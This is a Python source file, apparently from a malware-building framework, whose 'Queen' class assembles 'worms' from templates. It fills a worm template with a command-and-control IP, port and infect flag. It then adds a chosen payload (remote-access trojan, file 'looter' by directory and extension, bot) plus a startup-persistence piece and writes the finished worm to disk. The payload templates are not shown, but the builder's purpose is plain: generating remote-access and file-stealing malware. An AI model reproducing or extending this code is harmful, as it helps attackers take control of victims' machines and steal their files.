import os
from jinja2 import Template

from ..CONFIG import CLIENT_CHECK_CONN, CLIENT_PAUSE_CONN, APP_DIRECTORY, DRACO_OUT_MAIN_DIR, DEFAULT_IP, FORMAT_CODE

class Queen:
    def __init__(self, draco_callback):
        self.Draco = draco_callback
        self.out_dir = os.path.join(DRACO_OUT_MAIN_DIR, "HATCHERY")
        self.temp_dir = os.path.join(APP_DIRECTORY, "app", "hive", "templates")
        self.chameleon_path = os.path.join(APP_DIRECTORY, "app", "chameleon", "chameleon.py")
        self.chameleon_code = self._load_cham_code()
        self.make_dirs()
        self.Draco.Msg("\n[QUEEN] Hive is ready !!", level=True)
    
    def make_dirs(self):
        if not os.path.exists(self.out_dir):
            os.mkdir(self.out_dir)
    
    def _load_cham_code(self):
        with open(self.chameleon_path, "r") as f:
            data = f.read()
            data += "\n\n\n"
        return data
    
    def load_temp(self, name):
        with open(os.path.join(self.temp_dir, name), "r") as f:
            data = f.read()
        return data
    
    def save_worm(self, name, type_worm, code):
        wname = f"{name}_{type_worm}.py"
        with open(os.path.join(self.out_dir, wname), "w") as f:
            f.write(code)
        self.Draco.Msg(f"\n[QUEEN] New worm <{wname}> has been hatched !", level=True)
    
    def render_template(self, name, conf={}):
        temp = self.load_temp(name)
        temp = Template(temp)
        fcode = temp.render(conf)
        return fcode
    
    def make_basic(self, conf):
        config = {
            "IP" : conf.get("IP", DEFAULT_IP),
            "PORT" : int(conf["PORT"]),
            "FORMAT_CODE" : conf.get("FORMAT_CODE", FORMAT_CODE),
            "RAW_LEN" : conf['RAW_LEN'],
            "CLIENT_CHECK_CONN" : conf.get("CLIENT_CHECK_CONN", CLIENT_CHECK_CONN),
            "CLIENT_PAUSE_CONN" : conf.get("CLIENT_PAUSE_CONN", CLIENT_PAUSE_CONN),
            "SYS_MSG" : conf.get("SYS_MSG", "@@##$$"),
            "INFECT" : conf.get("INFECT", False)
        }

        temp = self.load_temp("basic_worm.py")
        temp = Template(temp)
        bcode = temp.render(config)
        return bcode
    
    def hatchering(self, conf):
        startup = self.render_template("startup.py", {"WORM_NAME" : conf["WORM_TYPE"]})
        cham = self._load_cham_code()
        a,b,c,d = "","","",""
        a = self.make_basic(conf)
        types = conf.get("TYPES")
        if types == "Echo":
            b = self.load_temp("echo.py")
        elif types == "BasicRat":
            b = self.load_temp("brat.py")
        elif types == "GypsyKing":
            b = self.load_temp("adv_worm.py")
            c = self.render_template("looter.py", {"LOOTER_DIR": conf["LOOTER_DIR"], "LOOTER_EXT" : conf["LOOTER_EXT"]})
        elif types == "RatHole":
            b = self.load_temp("adv_worm.py")
            c = self.load_temp("rat.py")
        elif types == "BasicBot":
            b = self.load_temp("basbot.py")
        fcode = cham + a + b + c + d + startup
        self.save_worm(conf["NAME"], conf["WORM_TYPE"], fcode)
